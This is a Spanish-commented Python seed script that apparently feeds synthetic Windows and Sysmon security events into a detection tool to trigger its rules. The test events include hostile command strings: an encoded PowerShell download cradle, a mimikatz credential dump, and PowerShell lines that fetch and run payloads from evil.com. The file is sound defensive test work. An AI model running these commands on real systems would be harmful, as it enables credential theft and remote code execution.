"""
ThreatScope – seed de datos de prueba.
Inyecta eventos sintéticos en la BD y dispara reglas + correlaciones.

Uso:
    cd backend
    python seed_test_data.py
"""
import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

from database import init_db, get_db, LogEvent
from rules import evaluate
import alerts as alert_mgr
import correlator

# ---------------------------------------------------------------------------
# Eventos sintéticos que activan cada regla
# ---------------------------------------------------------------------------
TEST_EVENTS = [
    # --- Sysmon ---
    {
        "label": "PowerShell obfuscado (Sysmon ID 1)",
        "event_id": 1,
        "source": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "DESKTOP-TEST",
        "user": "S-1-5-21-test",
        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -EncodedCommand aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQBlAHYAaQBsAC4AYwBvAG0AJwApAA==",
        "raw_xml": "<Event><System><EventID>1</EventID></System></Event>",
    },
    {
        "label": "Acceso a LSASS (Sysmon ID 10)",
        "event_id": 10,
        "source": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "DESKTOP-TEST",
        "user": "S-1-5-21-test",
        "process_name": "C:\\Tools\\mimikatz.exe",
        "command_line": "mimikatz.exe sekurlsa::logonpasswords",
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "raw_xml": "<Event><System><EventID>10</EventID></System></Event>",
    },
    {
        "label": "Remote Thread Injection (Sysmon ID 8)",
        "event_id": 8,
        "source": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "DESKTOP-TEST",
        "user": "S-1-5-21-test",
        "source_image": "C:\\Temp\\malware.exe",
        "target_image": "C:\\Windows\\explorer.exe",
        "process_name": "C:\\Temp\\malware.exe",
        "raw_xml": "<Event><System><EventID>8</EventID></System></Event>",
    },
    {
        "label": "Conexión de red sospechosa (Sysmon ID 3)",
        "event_id": 3,
        "source": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "DESKTOP-TEST",
        "user": "S-1-5-21-test",
        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "dest_ip": "185.220.101.45",
        "dest_port": "4444",
        "raw_xml": "<Event><System><EventID>3</EventID></System></Event>",
    },
    {
        "label": "Alternate Data Stream (Sysmon ID 15)",
        "event_id": 15,
        "source": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "DESKTOP-TEST",
        "user": "S-1-5-21-test",
        "target_filename": "C:\\Users\\test\\Downloads\\invoice.pdf:payload.exe",
        "raw_xml": "<Event><System><EventID>15</EventID></System></Event>",
    },
    {
        "label": "DNS query (Sysmon ID 22 - para correlacion Recon-Exec)",
        "event_id": 22,
        "source": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "DESKTOP-TEST",
        "user": "S-1-5-21-test",
        "process_name": "C:\\Windows\\System32\\svchost.exe",
        "raw_xml": "<Event><System><EventID>22</EventID></System></Event>",
    },
    # --- Windows Security ---
    {
        "label": "Logon fallido x1 (Security ID 4625)",
        "event_id": 4625,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "user": "Administrator",
        "target_user": "Administrator",
        "ip_address": "192.168.1.50",
        "logon_type": "3",
        "raw_xml": "<Event><System><EventID>4625</EventID></System></Event>",
    },
    {
        "label": "Logon fallido x2 (brute force)",
        "event_id": 4625,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "user": "Administrator",
        "target_user": "Administrator",
        "ip_address": "192.168.1.50",
        "logon_type": "3",
        "raw_xml": "<Event><System><EventID>4625</EventID></System></Event>",
    },
    {
        "label": "Logon fallido x3 (brute force)",
        "event_id": 4625,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "user": "Administrator",
        "target_user": "Administrator",
        "ip_address": "192.168.1.50",
        "logon_type": "3",
        "raw_xml": "<Event><System><EventID>4625</EventID></System></Event>",
    },
    {
        "label": "Logon fallido x4 (brute force)",
        "event_id": 4625,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "user": "Administrator",
        "target_user": "Administrator",
        "ip_address": "192.168.1.50",
        "logon_type": "3",
        "raw_xml": "<Event><System><EventID>4625</EventID></System></Event>",
    },
    {
        "label": "Logon fallido x5 (brute force — activa correlación)",
        "event_id": 4625,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "user": "Administrator",
        "target_user": "Administrator",
        "ip_address": "192.168.1.50",
        "logon_type": "3",
        "raw_xml": "<Event><System><EventID>4625</EventID></System></Event>",
    },
    {
        "label": "Credenciales explícitas (Security ID 4648)",
        "event_id": 4648,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "subject_user": "jsmith",
        "target_user": "Administrator",
        "ip_address": "192.168.1.100",
        "raw_xml": "<Event><System><EventID>4648</EventID></System></Event>",
    },
    {
        "label": "Privilegios sensibles asignados (Security ID 4672)",
        "event_id": 4672,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "subject_user": "SYSTEM",
        "privilege_list": "SeDebugPrivilege\nSeTcbPrivilege\nSeImpersonatePrivilege",
        "raw_xml": "<Event><System><EventID>4672</EventID></System></Event>",
    },
    {
        "label": "Nueva cuenta de usuario (Security ID 4720)",
        "event_id": 4720,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "subject_user": "attacker",
        "target_user": "backdoor_user",
        "raw_xml": "<Event><System><EventID>4720</EventID></System></Event>",
    },
    {
        "label": "Tarea programada creada (Security ID 4698)",
        "event_id": 4698,
        "source": "Microsoft-Windows-Security-Auditing",
        "channel": "Security",
        "computer": "DESKTOP-TEST",
        "subject_user": "jsmith",
        "task_name": "\\Microsoft\\Windows\\updater_hidden",
        "raw_xml": "<Event><System><EventID>4698</EventID></System></Event>",
    },
    # --- PowerShell Operational ---
    {
        "label": "Script block sospechoso (PowerShell ID 4104)",
        "event_id": 4104,
        "source": "Microsoft-Windows-PowerShell",
        "channel": "Microsoft-Windows-PowerShell/Operational",
        "computer": "DESKTOP-TEST",
        "user": "jsmith",
        "script_block_text": (
            "$c = New-Object Net.WebClient; "
            "iex($c.DownloadString('http://evil.com/payload.ps1')); "
            "[System.Convert]::FromBase64String('aGVsbG8=')"
        ),
        "script_path": "C:\\Temp\\loader.ps1",
        "raw_xml": "<Event><System><EventID>4104</EventID></System></Event>",
    },
    {
        "label": "Descarga con PowerShell (PowerShell ID 4103)",
        "event_id": 4103,
        "source": "Microsoft-Windows-PowerShell",
        "channel": "Microsoft-Windows-PowerShell/Operational",
        "computer": "DESKTOP-TEST",
        "user": "jsmith",
        "payload": "Invoke-WebRequest -Uri http://evil.com/rat.exe -OutFile C:\\Temp\\rat.exe",
        "raw_xml": "<Event><System><EventID>4103</EventID></System></Event>",
    },
]


def main():
    init_db()
    db = next(get_db())

    total_events = 0
    total_alerts = 0

    print("\n ThreatScope - Seed de datos de prueba\n" + "=" * 50)

    for ev in TEST_EVENTS:
        log_event = LogEvent(
            event_id=ev.get("event_id"),
            source=ev.get("source"),
            channel=ev.get("channel"),
            computer=ev.get("computer"),
            user=ev.get("user"),
            process_name=ev.get("process_name", ""),
            command_line=ev.get("command_line", ""),
            raw_xml=ev.get("raw_xml", ""),
        )
        db.add(log_event)
        db.flush()

        matched = evaluate(ev)
        for alert_data in matched:
            alert_mgr.create_alert(db, alert_data, log_event_id=log_event.id)
            total_alerts += 1

        status = f"  {len(matched)} alerta(s)" if matched else "  sin alerta"
        print(f"  [+] {ev['label']}{status}")
        total_events += 1

    db.commit()

    print("\n" + "-" * 50)
    print("  Ejecutando correlaciones...")
    corr_alerts = correlator.run_all_correlations(db)
    for a in corr_alerts:
        print(f"  [CORRELACION] {a['rule_name']} ({a['severity'].upper()})")

    print("\n" + "=" * 50)
    print(f"  Eventos insertados : {total_events}")
    print(f"  Alertas generadas  : {total_alerts + len(corr_alerts)}")
    print("  Abre http://localhost:5173 para verlo\n")

    db.close()


if __name__ == "__main__":
    main()
